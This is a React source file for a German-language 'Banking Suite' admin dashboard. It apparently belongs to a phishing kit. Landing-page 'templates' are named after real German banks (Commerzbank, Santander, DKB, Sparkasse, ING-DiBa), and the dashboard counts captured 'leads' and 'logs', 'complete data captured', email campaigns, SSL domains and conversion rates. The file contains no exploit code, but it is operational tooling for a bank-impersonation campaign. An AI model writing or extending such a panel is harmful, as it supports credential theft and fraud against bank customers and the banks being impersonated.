import React, { useState } from 'react';
import { 
  Users, 
  FileText, 
  Globe, 
  Mail, 
  Eye, 
  Target,
  Activity,
  AlertTriangle,
  CheckCircle,
  Zap,
  Plus,
  BarChart3,
  Loader
} from 'lucide-react';
import { StatsCard } from '../components/dashboard/StatsCard';
import { ActivityFeed } from '../components/dashboard/ActivityFeed';
import { QuickActions } from '../components/dashboard/QuickActions';
import { PerformanceChart } from '../components/dashboard/PerformanceChart';
import { TopPerformers } from '../components/dashboard/TopPerformers';
import { RecentLeads } from '../components/dashboard/RecentLeads';
import { useDashboard } from '../hooks/useDashboard';

export const Dashboard: React.FC = () => {
  const [timeRange, setTimeRange] = useState('7d');

  // Fetch real dashboard data
  const { 
    stats, 
    trends, 
    templatePerformance, 
    topPerformers, 
    recentActivity, 
    recentLeads, 
    isLoading 
  } = useDashboard(timeRange);

  // Fallback mock data for components that need it
  const mockData = {
    stats: {
      totalLeads: 1247,
      totalTemplates: 11,
      totalDomains: 8,
      totalCampaigns: 23,
      conversionRate: 3.2,
      activeVisitors: 47
    },
    trends: {
      leadsGrowth: 12.5,
      templatesGrowth: 8.3,
      campaignsGrowth: -2.1,
      conversionGrowth: 5.7
    },
    templatePerformance: [
      { name: 'Commerzbank', leads: 234, conversion: 4.2, color: 'bg-red-500' },
      { name: 'Santander', leads: 189, conversion: 3.8, color: 'bg-red-400' },
      { name: 'DKB', leads: 156, conversion: 3.1, color: 'bg-red-600' },
      { name: 'Sparkasse', leads: 143, conversion: 2.9, color: 'bg-gray-400' },
      { name: 'ING-DiBa', leads: 98, conversion: 3.5, color: 'bg-gray-500' }
    ],
    recentActivity: [
      { id: 1, type: 'lead' as const, template: 'Commerzbank', message: 'Neue Anmeldung erfasst', time: '2 Min', icon: Users, color: 'text-green-600' },
      { id: 2, type: 'campaign' as const, template: 'Santander', message: 'E-Mail Kampagne gestartet', time: '15 Min', icon: Mail, color: 'text-gray-600' },
      { id: 3, type: 'template' as const, template: 'DKB', message: 'Template aktiviert', time: '1 Std', icon: FileText, color: 'text-gray-600' },
      { id: 4, type: 'lead' as const, template: 'Sparkasse', message: 'Vollständige Daten erfasst', time: '2 Std', icon: CheckCircle, color: 'text-green-600' },
      { id: 5, type: 'alert' as const, template: 'ING-DiBa', message: 'Verdächtige Aktivität erkannt', time: '3 Std', icon: AlertTriangle, color: 'text-red-600' }
    ],
    topPerformers: [
      { rank: 1, template: 'Commerzbank', leads: 234, change: '+18%', trend: 'up' as const },
      { rank: 2, template: 'Santander', leads: 189, change: '+12%', trend: 'up' as const },
      { rank: 3, template: 'DKB', leads: 156, change: '+8%', trend: 'up' as const },
      { rank: 4, template: 'Sparkasse', leads: 143, change: '-3%', trend: 'down' as const },
      { rank: 5, template: 'ING-DiBa', leads: 98, change: '+15%', trend: 'up' as const }
    ],
    recentLeads: [
      { id: 1, name: 'Max Mustermann', email: 'max@example.com', template: 'Commerzbank', time: '2 Min', status: 'Neu' as const },
      { id: 2, name: 'Anna Schmidt', email: 'anna@example.com', template: 'Santander', time: '8 Min', status: 'Abgeschlossen' as const },
      { id: 3, name: 'Tom Weber', email: 'tom@example.com', template: 'DKB', time: '15 Min', status: 'In Bearbeitung' as const },
      { id: 4, name: 'Lisa Müller', email: 'lisa@example.com', template: 'Sparkasse', time: '23 Min', status: 'Abgeschlossen' as const },
      { id: 5, name: 'Frank Klein', email: 'frank@example.com', template: 'ING-DiBa', time: '31 Min', status: 'Neu' as const }
    ],
    quickActions: [
      { 
        id: 'new-campaign', 
        title: 'Neue Kampagne', 
        icon: Plus, 
        color: 'text-red-600', 
        hoverColor: 'border-red-400 bg-red-50',
        route: '/admin/campaigns'
      },
      { 
        id: 'add-domain', 
        title: 'Domain hinzufügen', 
        icon: Globe, 
        color: 'text-gray-600', 
        hoverColor: 'border-gray-400 bg-gray-50',
        route: '/admin/domains'
      },
      { 
        id: 'activate-template', 
        title: 'Template aktivieren', 
        icon: FileText, 
        color: 'text-gray-600', 
        hoverColor: 'border-gray-400 bg-gray-50',
        route: '/admin/landing-pages'
      },
      { 
        id: 'view-reports', 
        title: 'Bericht erstellen', 
        icon: BarChart3, 
        color: 'text-gray-600', 
        hoverColor: 'border-gray-400 bg-gray-50',
        route: '/admin/leads'
      }
    ]
  };


  return (
    <div className="space-y-6">
      {/* Header Section */}
      <div className="flex flex-col lg:flex-row lg:justify-between lg:items-center space-y-4 lg:space-y-0">
        <div>
          <h1 className="text-3xl font-bold text-gray-900">Dashboard</h1>
          <p className="text-sm text-gray-500 mt-1">
            Übersicht über Ihre Banking Suite Performance
          </p>
        </div>
        <div className="flex items-center space-x-3">
          <select
            value={timeRange}
            onChange={(e) => setTimeRange(e.target.value)}
            className="px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
          >
            <option value="24h">Letzte 24 Stunden</option>
            <option value="7d">Letzte 7 Tage</option>
            <option value="30d">Letzte 30 Tage</option>
            <option value="90d">Letzte 90 Tage</option>
          </select>
          <div className="flex items-center space-x-1 text-sm text-gray-500">
            <Activity className="h-4 w-4" />
            <span>Live</span>
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          </div>
        </div>
      </div>

      {/* Main Statistics Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-6 gap-6">
        <StatsCard
          title="Gesamt Logs"
          value={stats.totalLogs}
          icon={Users}
          iconColor="text-red-600"
          iconBgColor="bg-red-100"
          trend={{ value: trends.leadsGrowth, label: "vs. letzte Woche" }}
        />
        
        <StatsCard
          title="Templates"
          value={stats.totalTemplates}
          icon={FileText}
          iconColor="text-gray-600"
          iconBgColor="bg-gray-100"
          trend={{ value: trends.templatesGrowth, label: "vs. letzte Woche" }}
        />
        
        <StatsCard
          title="Domains"
          value={stats.activeDomains}
          icon={Globe}
          iconColor="text-gray-600"
          iconBgColor="bg-gray-100"
          subtitle="SSL Aktiv"
        />
        
        <StatsCard
          title="Kampagnen"
          value={stats.totalCampaigns}
          icon={Mail}
          iconColor="text-gray-600"
          iconBgColor="bg-gray-100"
          trend={{ value: trends.campaignsGrowth, label: "vs. letzte Woche" }}
        />
        
        <StatsCard
          title="Konversionsrate"
          value={`${stats.conversionRate}%`}
          icon={Target}
          iconColor="text-gray-600"
          iconBgColor="bg-gray-100"
          trend={{ value: trends.conversionGrowth, label: "vs. letzte Woche" }}
        />
        
        <StatsCard
          title="Aktive Besucher"
          value={stats.activeVisitors}
          icon={Eye}
          iconColor="text-gray-600"
          iconBgColor="bg-gray-100"
          subtitle="Live"
          isLive={true}
        />
      </div>

      {/* Loading State */}
      {isLoading && (
        <div className="flex justify-center items-center h-64">
          <Loader className="h-8 w-8 text-red-600 animate-spin" />
          <span className="ml-2 text-gray-600">Lade Dashboard-Daten...</span>
        </div>
      )}

      {/* Activity, Quick Actions, and Recent Leads Section */}
      {!isLoading && (
        <>
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <ActivityFeed activities={recentActivity} />
            <QuickActions actions={mockData.quickActions} />
            <RecentLeads leads={recentLeads} title="Neueste Logs" />
          </div>

          {/* Charts and Performance Section */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2">
              <PerformanceChart data={templatePerformance} />
            </div>
            
            <TopPerformers performers={topPerformers.slice(0, 3)} />
          </div>
        </>
      )}
    </div>
  );
};